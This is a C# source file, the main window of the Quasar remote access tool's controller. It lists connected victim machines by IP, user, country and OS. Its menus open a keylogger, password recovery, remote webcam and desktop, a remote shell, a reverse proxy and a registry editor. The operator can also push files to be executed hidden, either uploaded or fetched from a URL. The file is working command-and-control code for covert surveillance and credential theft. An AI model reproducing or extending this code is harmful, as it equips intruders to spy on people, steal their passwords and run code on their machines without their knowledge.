using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Quasar.Common.Enums;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using xServer.Core.Commands;
using xServer.Core.Cryptography;
using xServer.Core.Data;
using xServer.Core.Extensions;
using xServer.Enums;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Networking.Utilities;
using xServer.Core.Utilities;

namespace xServer.Forms
{
    public partial class FrmMain : Form
    {
        public QuasarServer ListenServer { get; set; }
        public static FrmMain Instance { get; private set; }

        private const int STATUS_ID = 4;
        private const int USERSTATUS_ID = 5;

        private bool _titleUpdateRunning;
        private bool _processingClientConnections;
        private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
        private readonly object _processingClientConnectionsLock = new object();
        private readonly object _lockClients = new object(); // lock for clients-listview

        public FrmMain()
        {
            Instance = this;

            AES.SetDefaultKey(Settings.Password);

            InitializeComponent();
        }

        public void UpdateWindowTitle()
        {
            if (_titleUpdateRunning) return;
            _titleUpdateRunning = true;
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    int selected = lstClients.SelectedItems.Count;
                    this.Text = (selected > 0)
                        ? string.Format("Quasar - Connected: {0} [Selected: {1}]", ListenServer.ConnectedClients.Length,
                            selected)
                        : string.Format("Quasar - Connected: {0}", ListenServer.ConnectedClients.Length);
                });
            }
            catch (Exception)
            {
            }
            _titleUpdateRunning = false;
        }

        private void InitializeServer()
        {
            ListenServer = new QuasarServer();

            ListenServer.ServerState += ServerState;
            ListenServer.ClientConnected += ClientConnected;
            ListenServer.ClientDisconnected += ClientDisconnected;
        }

        private void AutostartListening()
        {
            if (Settings.AutoListen && Settings.UseUPnP)
            {
                UPnP.Initialize(Settings.ListenPort);
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
            }
            else if (Settings.AutoListen)
            {
                UPnP.Initialize();
                ListenServer.Listen(Settings.ListenPort, Settings.IPv6Support);
            }
            else
            {
                UPnP.Initialize();
            }

            if (Settings.EnableNoIPUpdater)
            {
                NoIpUpdater.Start();
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            InitializeServer();
            AutostartListening();
        }

        private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            ListenServer.Disconnect();
            UPnP.DeletePortMap(Settings.ListenPort);
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            Instance = null;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            UpdateWindowTitle();
        }

        private void ServerState(Server server, bool listening, ushort port)
        {
            try
            {
                this.Invoke((MethodInvoker) delegate
                {
                    if (!listening)
                        lstClients.Items.Clear();
                    listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ClientConnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, true));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ClientDisconnected(Client client)
        {
            lock (_clientConnections)
            {
                if (!ListenServer.Listening) return;
                _clientConnections.Enqueue(new KeyValuePair<Client, bool>(client, false));
            }

            lock (_processingClientConnectionsLock)
            {
                if (!_processingClientConnections)
                {
                    _processingClientConnections = true;
                    ThreadPool.QueueUserWorkItem(ProcessClientConnections);
                }
            }
        }

        private void ProcessClientConnections(object state)
        {
            while (true)
            {
                KeyValuePair<Client, bool> client;
                lock (_clientConnections)
                {
                    if (!ListenServer.Listening)
                    {
                        _clientConnections.Clear();
                    }

                    if (_clientConnections.Count == 0)
                    {
                        lock (_processingClientConnectionsLock)
                        {
                            _processingClientConnections = false;
                        }
                        return;
                    }

                    client = _clientConnections.Dequeue();
                }

                if (client.Key != null)
                {
                    switch (client.Value)
                    {
                        case true:
                            AddClientToListview(client.Key);
                            if (Settings.ShowPopup)
                                ShowPopup(client.Key);
                            break;
                        case false:
                            RemoveClientFromListview(client.Key);
                            break;
                    }
                }
            }
        }

        /// <summary>
        /// Sets the tooltip text of the listview item of a client.
        /// </summary>
        /// <param name="client">The client on which the change is performed.</param>
        /// <param name="text">The new tooltip text.</param>
        public void SetToolTipText(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.ToolTipText = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Adds a connected client to the Listview.
        /// </summary>
        /// <param name="client">The client to add.</param>
        private void AddClientToListview(Client client)
        {
            if (client == null) return;

            try
            {
                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                }) { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.Items.Add(lvi);

                        /// Grouping new connected clients 

                        if (IsClientsGrouped)
                        {
                            GroupListView(lstClients, _SubItemIndex);
                        }
                    }
                });

                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Removes a connected client from the Listview.
        /// </summary>
        /// <param name="client">The client to remove.</param>
        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            lvi.Remove();
                            break;
                        }
                    }
                });
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }
        
        /// <summary>
        /// Sets the status of a client.
        /// </summary>
        /// <param name="client">The client to update the status of.</param>
        /// <param name="text">The new status.</param>
        public void SetStatusByClient(Client client, string text)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[STATUS_ID].Text = text;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Sets the user status of a client.
        /// </summary>
        /// <param name="client">The client to update the user status of.</param>
        /// <param name="userStatus">The new user status.</param>
        public void SetUserStatusByClient(Client client, UserStatus userStatus)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker) delegate
                {
                    var item = GetListViewItemByClient(client);
                    if (item != null)
                        item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        /// <summary>
        /// Gets the Listview item which belongs to the client. 
        /// </summary>
        /// <param name="client">The client to get the Listview item of.</param>
        /// <returns>Listview item of the client.</returns>
        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker) delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        /// <summary>
        /// Gets all selected clients.
        /// </summary>
        /// <returns>An array of all selected Clients.</returns>
        private Client[] GetSelectedClients()
        {
            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        /// <summary>
        /// Gets all connected clients.
        /// </summary>
        /// <returns>An array of all connected Clients.</returns>
        private Client[] GetConnectedClients()
        {
            return ListenServer.ConnectedClients;
        }

        /// <summary>
        /// Displays a popup with information about a client.
        /// </summary>
        /// <param name="c">The client.</param>
        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;
                    
                    notifyIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(),
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Connection"

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        if (!frm.UseDownload && !File.Exists(frm.UploadPath)) return;

                        if (frm.UseDownload)
                        {
                            foreach (Client c in GetSelectedClients())
                            {
                                c.Send(new DoClientUpdate
                                {
                                    Id = 0,
                                    DownloadUrl = frm.DownloadUrl,
                                    FileName = string.Empty,
                                    Block = new byte[0x00],
                                    MaxBlocks = 0,
                                    CurrentBlock = 0
                                });
                            }
                        }
                        else
                        {
                            string path = frm.UploadPath;

                            new Thread(() =>
                            {
                                bool error = false;
                                foreach (Client c in GetSelectedClients())
                                {
                                    if (c == null) continue;
                                    if (error) continue;

                                    FileSplit srcFile = new FileSplit(path);
                                    if (srcFile.MaxBlocks < 0)
                                    {
                                        MessageBox.Show($"Error reading file: {srcFile.LastError}",
                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }

                                    int id = FileHelper.GetNewTransferId();

                                    CommandHandler.HandleSetStatus(c,
                                        new SetStatus {Message = "Uploading file..."});

                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                    {
                                        byte[] block;
                                        if (!srcFile.ReadBlock(currentBlock, out block))
                                        {
                                            MessageBox.Show($"Error reading file: {srcFile.LastError}",
                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                            error = true;
                                            break;
                                        }

                                        c.Send(new DoClientUpdate
                                        {
                                            Id = id,
                                            DownloadUrl = string.Empty,
                                            FileName = string.Empty,
                                            Block = block,
                                            MaxBlocks = srcFile.MaxBlocks,
                                            CurrentBlock = currentBlock
                                        });
                                    }
                                }
                            }).Start();
                        }
                    }
                }
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count == 0) return;
            if (
                MessageBox.Show(
                    string.Format(
                        "Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!",
                        lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (Client c in GetSelectedClients())
                {
                    c.Send(new DoClientUninstall());
                }
            }
        }

        #endregion

        #region "System"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmTm != null)
                {
                    c.Value.FrmTm.Focus();
                    return;
                }
                FrmTaskManager frmTM = new FrmTaskManager(c);
                frmTM.Show();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmRs != null)
                {
                    c.Value.FrmRs.Focus();
                    return;
                }
                FrmRemoteShell frmRS = new FrmRemoteShell(c);
                frmRS.Show();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmProxy != null)
                {
                    c.Value.FrmProxy.Focus();
                    return;
                }

                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
                frmRS.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                foreach (Client c in GetSelectedClients())
                {
                    if (c.Value.FrmRe != null)
                    {
                        c.Value.FrmRe.Focus();
                        return;
                    }

                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
                    frmRE.Show();
                }
            }
        }

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Shutdown});
            }
        }

        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Restart});
            }
        }

        private void standbyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoShutdownAction {Action = ShutdownAction.Standby});
            }
        }

        #endregion

        #region "Surveillance"

        private void remoteDesktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
                frmRd.Show();
                frmRd.Focus();
            }
        }
        private void remoteWebcamToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmWebcam != null)
                {
                    c.Value.FrmWebcam.Focus();
                    return;
                }
                FrmRemoteWebcam frmWebcam = new FrmRemoteWebcam(c);
                frmWebcam.Show();
            }
        }
        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmPass != null)
                {
                    c.Value.FrmPass.Focus();
                    return;
                }

                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                frmPass.Show();
            }
        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                if (c.Value.FrmKl != null)
                {
                    c.Value.FrmKl.Focus();
                    return;
                }
                FrmKeylogger frmKL = new FrmKeylogger(c);
                frmKL.Show();
            }
        }

        #endregion

        #region "Miscellaneous"

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK && File.Exists(frm.LocalFilePath))
                    {
                        string path = frm.LocalFilePath;
                        bool hidden = frm.Hidden;

                        new Thread(() =>
                        {
                            bool error = false;
                            foreach (Client c in GetSelectedClients())
                            {
                                if (c == null) continue;
                                if (error) continue;

                                FileSplit srcFile = new FileSplit(path);
                                if (srcFile.MaxBlocks < 0)
                                {
                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    error = true;
                                    break;
                                }

                                int id = FileHelper.GetNewTransferId();

                                CommandHandler.HandleSetStatus(c,
                                    new SetStatus {Message = "Uploading file..."});

                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                                {
                                    byte[] block;
                                    if (srcFile.ReadBlock(currentBlock, out block))
                                    {
                                        c.SendBlocking(new DoUploadAndExecute
                                        {
                                            Id = id,
                                            FileName = Path.GetFileName(path),
                                            Block = block,
                                            MaxBlocks = srcFile.MaxBlocks,
                                            CurrentBlock = currentBlock,
                                            RunHidden = hidden
                                        });
                                    }
                                    else
                                    {
                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                        error = true;
                                        break;
                                    }
                                }
                            }
                        }).Start();
                    }
                }
            }
        }

        private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoDownloadAndExecute
                            {
                                Url = frm.Url,
                                RunHidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void visitWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoVisitWebsite
                            {
                                Url = frm.Url,
                                Hidden = frm.Hidden
                            });
                        }
                    }
                }
            }
        }

        private void showMessageboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lstClients.SelectedItems.Count != 0)
            {
                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
                {
                    if (frm.ShowDialog() == DialogResult.OK)
                    {
                        foreach (Client c in GetSelectedClients())
                        {
                            c.Send(new DoShowMessageBox
                            {
                                Caption = frm.MsgBoxCaption,
                                Text = frm.MsgBoxText,
                                Button = frm.MsgBoxButton,
                                Icon = frm.MsgBoxIcon
                            });
                        }
                    }
                }
            }
        }

        #endregion

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lstClients.SelectAllItems();
        }

        #endregion

        #region "MenuStrip"

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings(ListenServer))
            {
                frm.ShowDialog();
            }
        }

        private void builderToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("Client Builder is not available in DEBUG configuration.\nPlease build the project using RELEASE configuration.", "Not available", MessageBoxButtons.OK, MessageBoxIcon.Information);
#else
            using (var frm = new FrmBuilder())
            {
                frm.ShowDialog();
            }
#endif
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var frm = new FrmAbout())
            {
                frm.ShowDialog();
            }
        }

        #endregion

        #region "NotifyIcon"

        private void notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal)
                ? FormWindowState.Minimized
                : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }

        #endregion


        #region "GroupClients"

        /* 
           I think this is the original source for this code so it is nice to give a credit :D
           https://www.daniweb.com/programming/software-development/code/370423/automatic-listview-grouping
        */

        public int _SubItemIndex; //store the index to use it to auto group new connected clients 
        public bool IsClientsGrouped = false;

        private void GroupListView(ListView lstV, int SubItemIndex)
        {

            bool flag = true;
            lstV.BeginUpdate();

            foreach (ListViewItem l in lstV.Items)
            {
                string strmyGroupname = l.SubItems[SubItemIndex].Text;

                foreach (ListViewGroup lvg in lstV.Groups)
                {
                    if (lvg.Name == strmyGroupname) //checking if the group already exist
                    {
                        l.Group = lvg;
                        flag = false;
                    }
                }

                if (flag == true)
                {
                    ListViewGroup lstGrp = new ListViewGroup(strmyGroupname, strmyGroupname);
                    lstV.Groups.Add(lstGrp);
                    l.Group = lstGrp;
                }

                flag = true;
                lstV.EndUpdate();
                IsClientsGrouped = true;

            }
        }

        private void unGroupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem l in lstClients.Items)
            {
                l.Group = null;
            }
            lstClients.Groups.Clear();
            IsClientsGrouped = false;
        }

        private void tagToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _SubItemIndex = 1;
            GroupListView(lstClients, 1);
        }

        private void countryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _SubItemIndex = 6;
            GroupListView(lstClients, 6);
        }

        private void operatingSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _SubItemIndex = 7;
            GroupListView(lstClients, 7);
        }

        private void accountTypeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _SubItemIndex = 8;
            GroupListView(lstClients, 8);
        }

        private void userStatusToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _SubItemIndex = 5;
            GroupListView(lstClients, 5);
        }
    }

    #endregion

}